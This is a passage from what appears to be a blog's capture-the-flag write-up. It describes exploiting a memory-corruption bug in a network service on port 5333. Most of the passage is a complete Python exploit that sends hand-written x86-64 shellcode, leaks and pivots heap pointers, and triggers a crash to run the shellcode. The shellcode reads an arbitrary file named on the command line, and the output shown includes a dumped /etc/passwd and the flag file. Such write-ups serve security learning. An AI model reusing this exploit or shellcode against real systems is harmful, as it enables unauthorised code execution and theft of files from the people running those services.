<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;x</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>




<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>+<span class="o">]</span> <span class="nv">shellcode</span> <span class="o">=</span> 0x01355030
<span class="o">[</span>+<span class="o">]</span> <span class="nv">pivot</span> <span class="o">=</span> 0x01355030
<span class="o">[</span>+<span class="o">]</span> vulnerable <span class="nv">pointer</span> <span class="o">=</span> 0x013552b0
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
...snip...</code></pre></div>


<p>This also worked against the remote server! It showed me that there was a user called <code>amazon</code> with home directory <code>/home/amazon</code>. I adapted the exploit a bit to make it read arbitrary files. The instruction that needs adjusting is this one:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="p">;</span> NULL byte fix
xor byte <span class="o">[</span>rdi + 11<span class="o">]</span>, 0x41</code></pre></div>


<p>We need to update the value 11, or <code>0x0b</code>. The exploit code was modified once more, spraying <code>time.sleep()</code> calls here and there:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span>


<span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">5333</span><span class="p">))</span>

<span class="c"># banner</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
<span class="n">filename</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<span class="c"># send first string. this will be our shellcode</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 </span><span class="se">\xeb\x3f\x5f\x80\x77</span><span class="s">&#39;</span><span class="o">+</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;b&#39;</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff</span><span class="s">&#39;</span><span class="o">+</span><span class="n">filename</span><span class="o">+</span><span class="s">&#39;A</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="c">#s.recv(2)  # receive pesky &#39;&gt; &#39;</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] shellcode = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span>

<span class="c"># send second string. this will be our &#39;pivot&#39; pointer. </span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">p_shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] pivot = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span>

<span class="c"># let&#39;s crash the binary to see if this works</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;c 1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>

<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;u &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">p_pivot</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">p_vuln</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] vulnerable pointer = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span>

<span class="c"># send read request to crash binary</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;r &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="c"># terminate connection cleanly</span>
<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;x</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>


<p>(Note: this exploit fails if the address contains a NULL byte, a space or a zero, as these truncate data. During the CTF, I experienced no problems).</p>

<p>Now it was a matter of getting the flag. I tried <code>/home/amazon/key</code>, which returned nothing. Next was <code>/home/amazon/flag</code> and that was a bingo :)</p>
]]></content>
  </entry>
  
</feed>
